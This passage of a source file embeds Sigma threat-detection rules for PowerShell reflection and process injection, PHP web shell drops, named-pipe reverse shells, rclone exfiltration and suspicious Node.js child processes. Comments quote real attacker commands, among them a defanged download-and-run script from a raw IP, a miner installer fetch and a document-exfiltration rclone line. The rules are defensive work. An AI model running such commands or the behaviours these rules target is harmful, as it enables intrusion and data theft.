author: SOC Prime Team
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '.exe'
        CommandLine|contains:
            - 'GlobalSession.ClearLog' #{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($l)}
            - 'NTLMType2Response' #https://www.attackiq.com/2025/05/21/response-to-cisa-advisory-aa25-141a
            - 'RemoteEndPoint.Address.IPAddressToString' #https://www.attackiq.com/2025/05/21/response-to-cisa-advisory-aa25-141a
            - '.HttpListener' #https://www.attackiq.com/2025/05/21/response-to-cisa-advisory-aa25-141a
            - 'AllowReversiblePasswordEncryption'
            - 'GetHostAddresses'
            - 'TrustAllCertsPolicy'
            - 'ASCII.GetString' #+; https://isc.sans.edu/diary/rss/32682
            - 'IO.Compression.CompressionMode' #+
            - 'System.IO.Compression.FileSystem' #{ Add-Type Assembly 'System.IO.Compression.FileSystem'; [10.Compression.ZipFile]::CreateFromDirectory(\$path1', 'Spath2');} ;https://www.picussecurity.com/resource/blog/apt28-cyber-threat-profile-and-detailed-ttps
            - 'NoCompression' # [System.IO.Compression.CompressionLevel]::NoCompression, $false); #https://app.any.run/tasks/28a029a0-295a-4eca-ae91-8e645cdb3f5d/
            - 'ASCII.GetBytes' #+
            - 'Utf8.GetBytes' #https://cert.gov.ua/article/6281681; https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/; https://www.catonetworks.com/blog/cato-ctrl-vishing-and-microsoft-teams-used-deliver-phantombackdoor/; https://www.fortinet.com/blog/threat-research/dprk-related-campaigns-with-lnk-and-github-c2
            - 'Utf8.GetString' #[System.Text.Encoding]::UTF8.GetString((iwr $url -UseBasicParsing).Content) https://www.air.security/blog-posts/solanacry; https://redcanary.com/blog/threat-intelligence/mocha-manakin-nodejs-backdoor/; https://asec.ahnlab.com/en/92160/; https://www.pointwild.com/threat-intelligence/when-malware-talks-back/; https://isc.sans.edu/diary/32766; https://www.picussecurity.com/resource/blog/t1059-001-powershell; https://www.trellix.com/blogs/research/purerat-fileless-utilizing-steganography-process-hollowing/; https://asec.ahnlab.com/en/94685/
            - 'Unicode.GetBytes'
            - 'AsByteStream' #+
            #- 'Add-Type'
            - 'DllImport' #exc InstallELAMCertificateInfo
            - 'DefineDynamicAssembly'
            - 'DefineDynamicModule'
            - 'DefineType'
            - 'DefineConstructor'
            - 'CreateType'
            - 'DefineLiteral'
            #- 'DefineEnum'
            - 'DefineField'
            - 'ILGenerator'
            #- 'Emit'
            - 'UnverifiableCodeAttribute'
            - 'DefinePInvokeMethod'
            - 'GetTypes'
            - 'GetAssemblies'
            #- 'Methods'
            - 'GetConstructor'
            - 'GetDefaultMembers'
            - 'GetEvent'
            - 'GetField'
            - 'GetInterface'
            - 'GetMember'
            #- 'GetMethod'
            - 'GetNestedType'
            #- 'GetProperties'
            #- 'GetProperty'
            - 'InvokeMember'
            - 'MakeArrayType'
            - 'MakeByRefType'
            - 'MakeGenericType'
            - 'MakePointerType'
            - 'DeclaringMethod'
            - 'DeclaringType'
            - 'ReflectedType'
            - 'TypeHandle'
            - 'TypeInitializer'
            - 'UnderlyingSystemType'
            #- 'InteropServices'
            #- 'Marshal'
            - 'AllocHGlobal'
            - 'PtrToStructure'
            - 'StructureToPtr'
            - 'FreeHGlobal'
            #- 'IntPtr'
            - 'MemoryStream' #https://cert.gov.ua/article/6281681; https://securityaffairs.com/wp-content/uploads/2025/05/Sarcoma-Ransomware.pdf
            - 'DeflateStream'
            - 'FromBase64String' #https://cert.gov.ua/article/6284949; https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/; https://any.run/cybersecurity-blog/major-cyber-attacks-november-2025/; https://asec.ahnlab.com/en/92160/; https://securityaffairs.com/wp-content/uploads/2025/05/Sarcoma-Ransomware.pdf; https://www.pointwild.com/threat-intelligence/when-malware-talks-back/; https://www.trendmicro.com/en_us/research/26/c/boryptgrab-stealer-targets-users-via-deceptive-github-pages.html; https://www.elastic.co/security-labs/phantom-in-the-vault; https://www.pointwild.com/threat-intelligence/inside-vidar-2026-from-infection-to-memory-execution-via-jpeg-and-txt-payloads/; https://arcticwolf.com/resources/blog/bluenoroff-uses-clickfix-fileless-powershell-and-ai-generated-zoom-meetings-to-target-web3-sector/; https://blog.gdatasoftware.com/2026/05/38426-donutloader-remcos-rat; https://cofense.com/blog/from-fake-amazon-security-alert-to-harborwatch-agent-clickfix-delivery-of-a-custom-monitoring-rat; https://www.netskope.com/jp/blog/malware-on-the-blockchain-an-ongoing-campaigns-new-webrtc-twist; https://www.securonix.com/blog/task-stomp-powershell-backdoor-document-theft-remote-access; https://malbearlabs.com/posts/novel-malware-built-to-survive-the-analyst
            - 'WriteAllBytes' #https://cert.gov.ua/article/6284949; https://research.checkpoint.com/2026/silver-dragon-targets-organizations-in-southeast-asia-and-europe/; https://www.trendmicro.com/en_us/research/26/c/boryptgrab-stealer-targets-users-via-deceptive-github-pages.html; https://www.security.com/threat-intelligence/warlock-ransomware-critical-infrastructure
            - 'EncodedCommand' #https://www.huntress.com/blog/active-exploitation-solarwinds-web-help-desk-cve-2025-26399; https://www.microsoft.com/en-us/security/blog/2026/03/03/signed-malware-impersonating-workplace-apps-deploys-rmm-backdoors
            #- 'Bypass'
            - 'ToBase64String'
            - 'ExpandString'
            - 'GetPowerShell'
            - 'OpenProcess'
            - 'VirtualAlloc'
            - 'VirtualFree'
            - 'WriteProcessMemory'
            - 'CreateUserThread'
            - 'CloseHandle'
            - 'GetDelegateForFunctionPointer'
            - 'kernel32'
            - 'CreateThread'
            #- 'memcpy'
            - 'LoadLibrary'
            - 'GetModuleHandle'
            - 'GetProcAddress' #https://www.picussecurity.com/resource/blog/apt28-cyber-threat-profile-and-detailed-ttps
            - 'VirtualProtect'
            - 'FreeLibrary'
            - 'ReadProcessMemory'
            - 'CreateRemoteThread'
            - 'AdjustTokenPrivileges'
            - 'WriteByte'
            - 'WriteInt32'
            - 'OpenThreadToken'
            - 'PtrToString'
            - 'FreeHGlobal'
            - 'ZeroFreeGlobalAllocUnicode'
            - 'OpenProcessToken'
            - 'GetTokenInformation'
            - 'SetThreadToken'
            - 'ImpersonateLoggedOnUser' #https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/; https://www.picussecurity.com/resource/blog/apt15-cyber-espionage-campaigns-and-ttps-analysis
            - 'RevertToSelf'
            - 'GetLogonSessionData'
            - 'CreateProcessWithToken' #https://research.checkpoint.com/2025/cracking-valleyrat-from-builder-secrets-to-kernel-rootkits/
            - 'CreateProcessWithLogon'
            - 'DuplicateTokenEx'
            - 'OpenWindowStation'
            - 'OpenDesktop'
            - 'MiniDumpWriteDump' #https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/
            - 'AddSecurityPackage' #https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/
            - 'EnumerateSecurityPackages'
            - 'GetProcessHandle'
            #- 'DangerousGetHandle'
            - 'CryptoServiceProvider'
            #- 'Cryptography'
            - 'Cryptography.Aes' #https://cert.gov.ua/article/6282517
            - 'RijndaelManaged'
            - 'SHA1Managed'
            - 'CryptoStream'
            - 'CreateEncryptor'
            - 'CreateDecryptor'
            - 'TransformFinalBlock'
            - 'DeviceIoControl'
            - 'SetInformationProcess'
            - 'PasswordDeriveBytes'
            - 'GetAsyncKeyState'
            - 'GetKeyboardState'
            - 'GetForegroundWindow'
            - 'BindingFlags'
            - 'NonPublic'
            - 'ScriptBlockLogging'
            - 'LogPipelineExecutionDetails'
            - 'ProtectedEventLogging'
#    filters_chain1:
#        ParentImage|endswith: 'node.exe'
#        CommandLine|contains:
#        - 'UwB0AGEAcgB0ACAAIgBoAHQAdABwADoALwAvAGwAbwBjAGEAbABoAG8AcwB0ADoAMwAwADAAMAAiAA==' #Start "http://localhost:3000"
#        - 'UwB0AGEAcgB0ACAAIgBoAHQAdABwADoALwAvAGwAbwBjAGEAbABoAG8AcwB0ADoAOAAxACIA' #Start "http://localhost:81"
    filters:
        - CommandLine|contains:
            - '\Program Files'
            #- 'IABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBPAFMAVgBlAHIAcwBpAG8AbgAuAFYAZQByAHMAaQBvAG4AIAA' # .[.E.n.v.i.r
            - '--format='
            - 'showSignature'
            - 'InstallELAMCertificateInfo'
            - 'ADSyncSourceAnchor'
            - 'AttackSurfaceReductionRules'
            - 'ControlledFolderAccessProtectedFolders'
            - 'ExternalHelp'
            - 'MaxQueueSizePercentage'
            - 'InstallWdBoot'
            - 'AuthenticodeSignature'
            - 'GetEvents.VBS'
            - 'ciscat.exe'
            - 'SetImplementationFlags(128)' #activation stuff
        - Image|contains|all:
            - '\Program'
            - 'Files'
        - CommandLine|contains|all:
            - '\Program'
            - 'Files'
        - CommandLine|endswith:
            - 'suffix:_evt_' #Microsoft-Windows-ServicesForNFS-ServicesForNFS-Server
            - 'noextended' # GetEvents.VBS Microsoft-Windows-WinRM/
        - Image|endswith:
            - 'DropboxThumbnailGenerator.exe'
            - 'ciscat.exe'
            - '\MpCmdRun.exe' #"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\x86\mpcmdrun.exe" -GetLoadLibraryWAddress -OutputFileMappingHandle 760
            - '\ngen.exe'
        - ParentImage|endswith:
            - 'node.exe'
            - 'QualysAgent.exe'
            - 'system32\svchost.exe' #GPO Tasks with powershell job.
            - '\bin\runnerw64.exe' #phpstorm
            - '\cmd\git.exe' #git
            - 'SenseIR.exe' #Windows Defender
            - 'MsMpEng.exe' #Defender
            - 'ptoneclk.exe' #Webex
            - 'ptupdate.exe' #Webex
            - 'CcmExec.exe' #CCM
            - 'Rave.exe'
            - 'ehachettefle.exe'
            - 'Canva.exe'
            - 'Deezer.exe'
            - '_1st.exe' #PICUS BAS
            - 'GoTo.exe'
        - CommandLine|contains|all:
            - 'Defender' #Defender Advanced Threat Protection\DataCollection
            - 'Advanced'
            - 'Threat'
            - 'Protection'
            - 'DataCollection'
        - CommandLine|contains|all:
            - 'noroot' #/noroot /LegacyServiceBehavior
            - 'LegacyServiceBehavior'
            - 'ngen'
            - 'NativeImages'
        - CommandLine|contains|all:
            - '\Temp\MAS_' #activation stuff
            - '-el -qedit'
            - 'SetImplementationFlags'
        - CommandLine|contains|all:
            - '$Sku = 0' #activation stuff
            - 'Kernel-BrandingInfo'
            - 'DefineDynamicAssembly'
            - 'SLGetWindowsInformationDWORD'
        - CommandLine|contains|all:
            - '%WINDOWS_LONG%' #activation stuff
            - 'winbrand.dll'
    condition: selection and not filters # or filters_chain1)
falsepositives:
    - Administrative scripts activity.
level: medium
"#,
  // Possible Web Shell Drop - PHP Script or Web Config File Written by PHP Web Worker [Linux] (via file_event)
  "d0372d6b-b7c8-411f-8f20-4861d49494c4": r#"title: Possible Web Shell Drop - PHP Script or Web Config File Written by PHP Web Worker [Linux] (via file_event)
id: d0372d6b-b7c8-411f-8f20-4861d49494c4
status: stable
description: Detects a PHP web worker (php-fpm, php-cgi, lsphp, frankenphp, apache2, httpd) writing PHP scripts, .htaccess or .user.ini files. After PHP2Shell remote code execution, attackers drop web shells or set auto_prepend_file in .user.ini for persistence.
author: SOC Prime Team
references:
  - https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities
tags:
  - attack.persistence
  - attack.t1505.003
logsource:
  product: linux
  category: file_event
detection:
    selection_image:
      - Image|endswith:
            - '/php-fpm'
            - '/php-cgi'
            - '/sw-engine-fpm'
            - '/httpd'
            - '/apache2'
            - '/nginx'
            - '/lsphp'
            - '/frankenphp'
      - Image|contains:
            - '/php-fpm' #php-fpm; php-fpm8.3, etc
            - '/lsphp'
    selection_target:
        TargetFilename|endswith:
            - '.php5'
            - '.php7'
            - '.php'
            - '.phtml'
            - '.phar'
            - '.pht'
            - '/.user.ini'
            - '/.htaccess'
    filters:
        TargetFilename|contains:
            - '/wp-content/cache'
            - '/wp-content/upgrade'
            - '/bootstrap' # Laravel
            - '/var/cache'
    condition: selection_image and selection_target and not filters
falsepositives:
  - CMS plugin / theme installation and auto-updates via web UI
  - Template engines compiling PHP cache files outside filtered paths
level: medium
"#,
  // FIFO Special File Creation (via cmdline)
  "d5c6360e-6637-44c8-bf60-46018f419a08": r#"title: FIFO Special File Creation (via cmdline)
id: d5c6360e-6637-44c8-bf60-46018f419a08
status: stable
description: A named pipes could be used for reverse shell creation.
author: SOC Prime Team
references:
    - https://www.microsoft.com/en-us/security/blog/2026/09/30/unauthenticated-command-injection-on-internet-facing-mail-servers-tracking-cve-2026-73570/
    - https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities
    - https://cert.gov.ua/article/6123309
    - https://www.oreilly.com/library/view/hands-on-red-team/9781788995238/b76e6441-5999-45e4-949e-bd332cb21cce.xhtml
    - https://podalirius.net/en/articles/unix-reverse-shells-cheatsheet/
    - https://saucer-man.com/reverse/
    - https://arcticwolf.com/resources/blog/lorenz-ransomware-chiseling-in/
    - https://gist.github.com/joe-desimone/ff0cae0aa0d20965d502e7a97cbde3e3
    - https://thehackernews.com/2025/12/critical-rsc-bugs-in-react-and-nextjs.html
tags:
    - attack.command_and_control
    - attack.t1095
    - attack.execution
    - attack.t1059.004
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        - CommandLine|contains|all:
            - 'mkfifo'
            - '/tmp' # https://www.microsoft.com/en-us/security/blog/2026/09/30/unauthenticated-command-injection-on-internet-facing-mail-servers-tracking-cve-2026-73570/
        - CommandLine|contains|all:
            - 'mknod'
            - '/tmp'
        - CommandLine|contains|all:
            - 'mkfifo'
            - 'bin'
            - 'sh'
        #- CommandLine|contains|all:
        #    - 'cat'
        #    - 'tmp'
        #    - 'bin'
        #    - '2>&1'
    filters:
        CommandLine|contains:
            - 'coolmount'
            - 'which mkfifo'
            - 'mode=0700'
            - 'gitstatus'
            - '.worker.'
            - 'dracut'
            - 'mkinitramfs'
            - 'ldd '
            - 'cron.log'
            - 'cronlog'
            - 'cronpipe'
            - '/usr/bin/defaults'
    condition: selection and not filters
falsepositives:
    - medium, need additional excludes, based on expected activity.
level: medium
"#,
  // Suspicious Executions from User Default Folders v2 (via process_creation)
  "df03915e-4d53-4fad-94f2-8310906315f9": r#"title: Suspicious Executions from User Default Folders v2 (via process_creation)
id: df03915e-4d53-4fad-94f2-8310906315f9
status: stable
description: The default Users folder is commonly abused by advesaries for staging of malware files, this execution should be reviewed.
author: SOC Prime Team
references:
    - https://medium.com/@DCSO_CyTec/catch-them-while-you-can-5c43007ae99e
    - https://www.acronis.com/en-us/cyber-protection-center/posts/zola-ransomware-the-many-faces-of-the-proton-family/
    - https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/apt40-advisory-prc-mss-tradecraft-in-action
    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-190a
    - https://cert.gov.ua/article/4501891
    - https://cert.gov.ua/article/3718487
    - https://cert.gov.ua/article/341128
tags:
    - attack.defense_evasion
    - attack.t1564
logsource:
    category: process_creation
    product: windows
detection:
    selection_image:
        ParentImage|endswith:
            - '.exe'
            - '.tmp'
            - '.src'
        Image|endswith:
            - '.exe'
            - '.tmp'
            - '.com'
            - '.scr'
    selection_usr:
        Image|contains: '\Users' #ex.:C:\Users\$ENV:UserName\docx.exe"
    filters:
        - ParentImage|endswith:
            - 'explorer.exe'
            - 'services.exe'
            - 'taskeng.exe'
        - ParentImage|contains|all:
            - '\Program'
            - 'Files'
        - Image|endswith:
            - '\sigma.exe'
            - '\KeePass.exe'
        - Image|contains:
            - '\PortableApps'
            - '\Downloads'
            - '\Desktop'
            - '\Documents'
            - '\Pictures'
            - '\Favorites'
            - '\Music' #https://medium.com/@DCSO_CyTec/catch-them-while-you-can-5c43007ae99e
            - '\Searches'
            - '\Contacts'
            - '\Links'
            - '\3D Objects'
            - '\AppData'
            - '\Anaconda3'
            - '\PycharmProjects'
            - '.wdm'
            #- '.vscode'
            - '\.' #"C:\Users\xxx\.config\herd\bin\php83\php.exe"
            - '\OneDrive\'
            - '\vs-kubernetes'
            - '\vscode'
            - '\DriverStore'
            - 'GoogleCloudDirSync'
            - '\pipx'
            - '\.local\bin\' # by git\usr\bin\bash.exe -> C:\Users\xxx\.local\bin\jinja2.exe
            - 'MobaXterm' #C:\Users\xxx~1.xxx\DOCUME~1\MobaXterm\slash\bin\xkbcomp_w32.exe
    filters_chain1:
        ParentImage|endswith: 'eclipse.exe'
        Image|endswith: '\javaw.exe'
    condition: (selection_image and selection_usr) and not (filters or filters_chain1)
falsepositives:
    - legitimate application and scripts which reduce default user folders.
    - files created by user
level: low
"#,
  // Possible Data Exfiltration over Rclone Tool (via cmdline)
  "e0ee9a7b-fed3-4467-a012-0b04338e1334": r#"title: Possible Data Exfiltration over Rclone Tool (via cmdline)
id: e0ee9a7b-fed3-4467-a012-0b04338e1334
status: stable
description: Need to exclude approved services! Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control. The reliance on the surrounding environment may necessitate the implementation of additional filtering measures to prevent false positives.
author: SOC Prime Team
references:
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-293a
  - https://scamdrill.com/blog/teams-help-desk-impersonation-smb
  - https://www.extrahop.com/blog/aoa-detecting-the-behavior-of-medusa-ransomware-operations
  - https://www.picussecurity.com/resource/blog/inc-ransomware-explained-how-it-attacks-healthcare-and-education
  - https://arcticwolf.com/resources/blog/exploitation-of-cve-2026-0257-leads-to-qilin-ransomware/
  - https://www.picussecurity.com/resource/blog/gamaredon-primitive-bear-apt-profile-and-mitre-attck-breakdown
  - https://www.picussecurity.com/resource/blog/how-sinobi-ransomware-encrypts-files-and-destroys-backups
  - https://www.picussecurity.com/resource/blog/tengu-ransomware-attack-chain-from-initial-access-to-encryption
  - https://labs.yarix.com/2026/05/unusual-data-exfiltration-paths-leveraging-rclone-for-sharepoint-data-theft/
  - https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/
  - https://medium.com/@DCSO_CyTec/catch-them-while-you-can-5c43007ae99e
  - https://unit42.paloaltonetworks.com/threat-assessment-blacksuit-ransomware-ignoble-scorpius/
  - https://www.welivesecurity.com/en/eset-research/cyberespionage-gamaredon-way-analysis-toolset-used-spy-ukraine-2022-2023/
  - https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/
  - https://adlumin.com/post/fog-ransomware-now-targeting-the-financial-sector/
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-249a
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-242a
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a
  - https://www.crowdstrike.com/blog/anatomy-of-alpha-spider-ransomware/
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-data-exfiltration
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-289a
  - https://cert.gov.ua/article/5213167
  - https://jsac.jpcert.or.jp/archive/2023/pdf/JSAC2023_1_1_yamashige-nakatani-tanaka_en.pdf
  - https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/
  - https://www.logpoint.com/wp-content/uploads/2023/12/et-cactus-4-12.pdf
  - https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/
  - https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/
  - https://www.huntress.com//blog/lolbin-to-inc-ransomware
  - https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/
  - https://www.trendmicro.com/en_us/research/24/i/how-ransomhub-ransomware-uses-edrkillshifter-to-disable-edr-and-.html
  - https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/
  - https://www.microsoft.com/en-us/security/blog/2025/02/12/the-badpilot-campaign-seashell-blizzard-subgroup-conducts-multiyear-global-access-operation/
  - https://asec.ahnlab.com/en/86310/
  - https://www.picussecurity.com/resource/blog/ransomhub
  - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/
  - https://www.esentire.com/blog/threat-actors-deploy-sinobi-ransomware-via-compromised-sonicwall-ssl-vpn-credentials
  - https://arcticwolf.com/resources/blog/smash-and-grab-aggressive-akira-campaign-targets-sonicwall-vpns/
  - https://sosransomware.com/en/ransomware-groups/worldleaks-between-pure-extortion-and-traditional-ransomware-whats-the-difference/
  - https://ctrlaltintel.com/threat%20research/MuddyWater/
  - https://www.seqrite.com/blog/operation-camelclone-multi-region-espionage-campaign-targets-government-and-defense-entities-amidst-regional-tensions/
  - https://ctrlaltintel.com/research/MuddyWater/
tags:
  - attack.exfiltration
  - attack.t1567
logsource:
    category: process_creation
    product: windows
detection:
  selection_name:
    Image|endswith: 'rclone.exe' # https://arcticwolf.com/resources/blog/exploitation-of-cve-2026-0257-leads-to-qilin-ransomware/; https://www.picussecurity.com/resource/blog/inc-ransomware-explained-how-it-attacks-healthcare-and-education
    CommandLine|contains: 'rclone' # https://ctrlaltintel.com/research/MuddyWater/; https://labs.yarix.com/2026/05/unusual-data-exfiltration-paths-leveraging-rclone-for-sharepoint-data-theft/
  selection_args:
    - CommandLine|contains|all:
      - 'rcd' #rclone.exe rcd --rc-web-gui
      - 'rc-web-gui'
    - CommandLine|contains|all:
      - 'copy'
      - 'config'
      - 'auto-confirm'
      - '-q' #rclone.exe copy --config=C:/temp/rclone.conf “C:/data” remote:data -q --ignore-existing --auto-confirm
    - CommandLine|contains|all:
      - 'copy'
      - 'remote:'
      - 'bwlimit'
    - CommandLine|contains|all:
      - 'copy'
      - 'remote:'
      - 'max-size'
    - CommandLine|contains|all:
      - 'copy'
      - 'mega:' #rclone  copy B:\\MSSQL mega:redacted --progress; https://medium.com/@DCSO_CyTec/catch-them-while-you-can-5c43007ae99e
    - CommandLine|contains|all:
      - 'copy'
      - 'remote:'
      - 'max-age'
    - CommandLine|contains|all:
      - 'copy'
      - 'remote:'
      - 'include' #"C:\Users\%USERNAME%\AppData\Local\Microsoft\OneDrive\Update\UpdateService.exe" "copy" "C:\Users\%USERNAME%\Desktop" "remote:%COMPUTERNAME%\Desktop" "--include" "*.{{jpe?g|txt|docx?|rtf|pdf|xlsx?|xlsm|pptx?|zip|rar|7z}}" "-M" "--max-size" "50M" "--max-age" "200d" "--bwlimit" "1M:1M" "--order-by" "modtime,desc" "--log-file=C:\Users\%USERNAME%\AppData\Local\Microsoft\OneDrive\Update\log_1.dat" "-vv"; https://www.seqrite.com/blog/operation-camelclone-multi-region-espionage-campaign-targets-government-and-defense-entities-amidst-regional-tensions/
  filters:
    - CommandLine|endswith:
      - ' config' #rclone.exe  config
    - CommandLine|contains:
      - ' mount ' #D:\rclone\rclone.exe  mount my_RC: N: --network-mode --vfs-cache-mode full --no-console
  condition: (selection_name or selection_args) and not filters
falsepositives:
  - Storage providers approved for business use.
  - The reliance on the surrounding environment may necessitate the implementation of additional filtering measures to prevent false positives.
level: medium
"#,
  // Suspicious NodeJS Child Processes [Linux] (via cmdline)
  "e24cf77d-ff3b-492c-9942-0507b45f7ffb": r#"title: Suspicious NodeJS Child Processes [Linux] (via cmdline)
id: e24cf77d-ff3b-492c-9942-0507b45f7ffb
status: stable
description: This rule is designed to identify suspicious activities involving NodeJS child processes initiated through the command line. It is highly recommended to baseline your activity and tune out common business use cases.
author: SOC Prime Team
references:
    - https://research.jfrog.com/post/beyond-testmetest-42-hijacked-github-repos/
    - https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
    - https://orca.security/resources/blog/hades-pypi-supply-chain-attack
    - https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-CVE-2025-66478-next/
    - https://thehackernews.com/2025/12/critical-rsc-bugs-in-react-and-nextjs.html
    - https://github.com/assetnote/react2shell-scanner
    - https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478
    - https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3
    - https://www.greynoise.io/blog/cve-2025-55182-react2shell-opportunistic-exploitation-in-the-wild-what-the-greynoise-observation-grid-is-seeing-so-far
    - https://kmsec.uk/blog/js-malware-bigmathix/
    - https://socket.dev/blog/stegabin-26-malicious-npm-packages-use-pastebin-steganography
tags:
    - attack.execution
    - attack.t1059.006
    - attack.t1059.004
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        ParentImage|endswith:
            - '/node' # Node.js process https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
            - '/bun'   # Bun 1.4.4 https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; Hades Campaign uses Bun JS runtime as Node.js alternative
        Image|endswith:
            - '/curl' # malware download https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; curl -s -L hxxps[://]raw[.]githubusercontent[.]com/C3Pool/xmrig_setup/master/setup_c3pool_miner[.]sh
            - '/wget' # malware download https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; wget http://162[.]215[.]170[.]26:3000/sex[.]sh && bash sex[.]sh; https://socket.dev/blog/stegabin-26-malicious-npm-packages-use-pastebin-steganography
          #  - '/python' noisy.
            - '/ping' # ping 5axzi7[.]dnslog[.]cn
            - '/nslookup'
            - '/cat'
            - '/java'
            - '/ruby'
            - '/perl'
            - '/systemctl' #https://kmsec.uk/blog/js-malware-bigmathix/
            - '/git'       # Hades Campaign - exfiltrates encrypted data to attacker GitHub repos via git push
    condition: selection
falsepositives:
    - Unknown
level: medium
"#,
  // Suspicious VSS Registry Modifications Attempt (via registry_event)
  "e2d4f42e-83a4-4008-ba26-38cf59b7dfeb": r#"title: Suspicious VSS Registry Modifications Attempt (via registry_event)
status: stable
description: Adversaries may try to modify VSS registry keys in order to perform malicious activity, such as disrupting backup services.
author: SOC Prime Team
references:
  - https://www.binarydefense.com/resources/blog/qakbot-strikes-back-understanding-the-threat/
tags:
  - attack.t1490
  - attack.impact
logsource:
  category: registry_event
  product: windows
detection:
  selection_base:
    TargetObject|contains|all:
      - 'CurrentControlSet'
      - 'Services'
      - 'VSS'
      - 'Diag'
      - 'SPP' #System\CurrentControlSet\Services\VSS\Diag\SPP
  selection_details:
    TargetObject|contains:
      - 'SppGetSnapshots (Enter)'
      - 'SppGetSnapShots (Leave)'
      - 'SppEnumGroups (Enter)'
  condition: selection_base and selection_details
falsepositives:
  - Unknown
level: medium
id: e2d4f42e-83a4-4008-ba26-38cf59b7dfeb
"#,
  // Suspicious Java Child Process [Windows] (via cmdline)
  "e4b61ca2-c614-4b89-8530-c5e543e8ee42": r#"title: Suspicious Java Child Process [Windows] (via cmdline)
id: e4b61ca2-c614-4b89-8530-c5e543e8ee42
status: stable
description: This rule identifies potentially malicious child processes spawned by Java-based malware. This may indicate an attempt by the malware to perform malicious actions such as downloading additional payloads, stealing sensitive information, or establishing persistence. The reliance on the surrounding environment may necessitate the implementation of additional filtering measures to prevent false positives.
references:
    - https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification #SysAid On-Prem Software CVE-2023-47246 Vulnerability
    - https://badoption.eu/blog/2023/06/01/zipjar.html#poc
    - https://www.mandiant.com/resources/blog/unc961-multiverse-financially-motivated
    - https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/
    - https://securitylabs.datadoghq.com/articles/openssl-november-1-vulnerabilities/
    - https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence/
